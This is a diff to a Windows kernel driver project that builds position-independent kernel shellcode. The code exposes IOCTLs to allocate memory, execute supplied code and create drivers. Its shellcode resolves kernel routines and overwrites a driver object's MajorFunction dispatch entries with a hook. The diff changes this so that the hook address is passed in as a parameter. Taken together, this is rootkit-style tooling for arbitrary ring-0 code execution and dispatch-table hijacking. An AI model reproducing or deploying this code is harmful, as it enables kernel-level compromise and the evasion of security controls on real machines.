@@ -1,9 +1,11 @@
 #pragma warning( disable: 4100 4101 4103 4189 4996 6271 6066 6273 6328)
+#pragma runtime_checks("", off)
+#pragma optimize("", off)
+#pragma strict_gs_check(off)
 
 #include <ntifs.h>
 #include <minwindef.h>
 #include <wdm.h>
-
 
 #define IOCTL_UNKNOWN_BASE					FILE_DEVICE_UNKNOWN
 #define IOCTL_ALLOCATEMEM_NONPAGED    CTL_CODE(IOCTL_UNKNOWN_BASE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -14,17 +16,10 @@
 #define IOCTL_EXECUTE_CODE		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0805, METHOD_BUFFERED, FILE_WRITE_ACCESS)
 #define IOCTL_CREATE_DRIVER		CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0806, METHOD_BUFFERED, FILE_WRITE_ACCESS)
 
-#pragma runtime_checks("", off)
-#pragma optimize("", off)
-#pragma strict_gs_check(off)
-
-#define DRIVER_PREFIX "KernelPISCreator"
-#define DRIVER_TAG 'kpic'
-
 struct KernelPisParameters
 {
 	LPVOID MmGetSystemRoutineAddress;
-	LPVOID dummy;
+	LPVOID HookFunctionAddress;
 	USHORT dummy2;
 };
 
@@ -61,7 +56,6 @@ typedef NTSTATUS(__stdcall* pObReferenceObjectByName)(
 	__out PVOID* Object);
 typedef LONG_PTR(__stdcall* pObfDereferenceObject)(_In_  PVOID Object);
 typedef LONG_PTR(__stdcall* pRtlInitUnicodeString)(PUNICODE_STRING  DestinationString, PCWSTR SourceString);
-typedef NTSTATUS(__stdcall* pIoCreateDriver)(_In_  PUNICODE_STRING DriverName, _In_  PDRIVER_INITIALIZE InitializationFunction);
 typedef PVOID(__stdcall* p_InterlockedExchangePointerString)(PVOID * Target, _In_ PVOID Value);
 
 NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
@@ -251,6 +245,7 @@ __stdcall  HookedDispatchIoctl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
 		
 		pDbgPrint DbgPrint = (pDbgPrint)inp->pDbgPrint;
 		pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)inp->pRtlInitUnicodeString;
+		typedef NTSTATUS(__stdcall* pIoCreateDriver)(_In_  PUNICODE_STRING DriverName, _In_  PDRIVER_INITIALIZE InitializationFunction);
 		pIoCreateDriver IoCreateDriver = (pIoCreateDriver)inp->pIoCreateDriver;
 
 		DbgPrint("Entering IOCTL_CREATE_DRIVER\n");
@@ -293,6 +288,11 @@ __stdcall PicStart(UINT64 StartContext)
 	if (NULL == mmGetSystemRoutineAddress)
 		return STATUS_UNSUCCESSFUL;
 	
+	// Get hook function address
+	PDRIVER_DISPATCH HookFunctionAddress = (PDRIVER_DISPATCH)pisParameters->HookFunctionAddress;
+	if (NULL == HookFunctionAddress)
+		return STATUS_UNSUCCESSFUL;
+
 	// Function name and strings
 	WCHAR DbgPrintString[] = { 'D', 'b', 'g', 'P', 'r', 'i', 'n', 't', '\0' };
 	WCHAR  greeting[] = { 'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'K', 'e', 'r', 'n', 'e', 'l', ' ', 'm', 'o', 'd', 'e', ' ', 's', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', '!', '\0' };
@@ -347,7 +347,7 @@ __stdcall PicStart(UINT64 StartContext)
 	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
 		if (i == IRP_MJ_DEVICE_CONTROL  || i == IRP_MJ_CLOSE || i == IRP_MJ_CREATE) {
 			//interlockedExchangePointer((PVOID*)&DriverObject->MajorFunction[i], HookedDispatchIoctl);
-			DriverObject->MajorFunction[i] = HookedDispatchIoctl;
+			DriverObject->MajorFunction[i] = HookFunctionAddress;
 		}
 	}
 	
@@ -395,7 +395,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
 
 	KernelPisParameters pisParameters;
 	pisParameters.MmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
-	pisParameters.dummy = NULL;
+	pisParameters.HookFunctionAddress = HookedDispatchIoctl;
 	pisParameters.dummy2 = NULL;
 
 	IRP FakeIRP;
